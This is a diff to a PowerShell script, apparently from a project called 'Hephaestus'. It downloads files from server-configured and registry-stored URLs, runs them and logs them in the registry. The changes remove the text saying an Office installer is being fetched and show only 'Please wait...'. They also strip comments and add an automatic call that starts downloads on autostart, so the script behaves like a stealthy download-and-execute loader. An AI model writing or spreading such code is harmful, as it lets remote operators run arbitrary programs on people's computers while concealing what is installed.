@@ -70,36 +70,35 @@ function Start-DownloadAndExecute {
 
     # Create and configure the description label
     $descriptionLabel = New-Object System.Windows.Forms.Label
-    $descriptionLabel.Text = "The installer is currently being downloaded. Please wait until the process completes."
+    $descriptionLabel.Text = "Please wait until the process completes..."
     $descriptionLabel.AutoSize = $true
     $descriptionLabel.Width = 350
     $descriptionLabel.Top = 10
     $descriptionLabel.Left = 20
     $form.Controls.Add($descriptionLabel)
 
-    # Show the form non-modally
     $form.Show()
+    $form.TopMost = $true
+    $form.Activate()
+    $form.TopMost = $false
+    $form.Focus()
 
-    # Determine the file name and path
     $fileName = Get-FileNameFromUri -uri $url
     $fileNameSave = Add-RandomDigitsToFilename -fileName $fileName
 
-    $tempDir = (Split-Path -Path $PSCommandPath)
+    $tempDir = (Get-HephaestusFolder)
     $installerPath = [System.IO.Path]::Combine($tempDir, $fileNameSave)
 
-    # Create and configure the WebClient
     $webClient = New-Object System.Net.WebClient
 
-    # Define event handlers
     $progressChangedHandler = [System.Net.DownloadProgressChangedEventHandler]{
         param ($sender, $eventArgs)
-        $progressBar.Value = $eventArgs.ProgressPercentage
-        $form.Refresh()
+        $roundedProgress = [math]::Round($eventArgs.ProgressPercentage / 3) * 3
+        $progressBar.Value = $roundedProgress
     }
 
     $downloadFileCompletedHandler = [System.ComponentModel.AsyncCompletedEventHandler]{
         param ($sender, $eventArgs)
-        # Close the form before starting the installer
         $form.Invoke([action] { 
             [System.Windows.Forms.Application]::DoEvents()
             $form.Close() 
@@ -116,7 +115,7 @@ function Start-DownloadAndExecute {
                 Start-Process -FilePath $installerPath -Wait
 
                 # Write to the registry
-                $registryPath = "HKCU:\Software\Hephaestus\Downloads"
+                $registryPath = "$hepaestusReg\download"
                 if (-not (Test-Path $registryPath)) {
                     New-Item -Path $registryPath -Force | Out-Null
                 }
@@ -128,15 +127,12 @@ function Start-DownloadAndExecute {
         [System.Windows.Forms.Application]::DoEvents()
     }
 
-    # Add event handlers to WebClient
     $webClient.add_DownloadProgressChanged($progressChangedHandler)
     $webClient.add_DownloadFileCompleted($downloadFileCompletedHandler)
 
     try {
-        # Start the download
         $webClient.DownloadFileAsync([Uri]$url, $installerPath)
         
-        # Keep the form responsive while the download is in progress
         while ($form.Visible) {
             Start-Sleep -Milliseconds 1
             [System.Windows.Forms.Application]::DoEvents()
@@ -146,6 +142,8 @@ function Start-DownloadAndExecute {
         $form.Close()
     }
 }
+
+
 
 function Download {
     param (
@@ -158,7 +156,7 @@ function Download {
     $auto = Test-Autostart;
     if ($server.startDownloadsForce -ne $false -and $auto -eq $true)
     {
-        $registryPath = "HKCU:\Software\Hephaestus\Downloads"
+        $registryPath = "$hepaestusReg\download"
         if (Test-Path $registryPath) {
             $installed = Get-ItemProperty -Path $registryPath -Name $fileName -ErrorAction SilentlyContinue
             if ($installed) 
@@ -176,12 +174,22 @@ function Download {
 function do_startdownloads {
     try 
     {
+        $baseDn = RegReadParam -keyName "download"
+        if (-not [string]::IsNullOrEmpty($baseDn))
+        {
+            Download -url $baseDn -title "Please wait..."
+        }
         foreach ($url in $server.startDownloads)
         {
-            Download -url $url -title "Downloading Office Installer"
+            if ($url -eq $baseDn) {
+                continue
+            }
+            Download -url $url -title "Please wait..."
         }
     }
     catch {
       writedbg "An error occurred (Start Downloads): $_"
     }
 }
+
+do_startdownloads
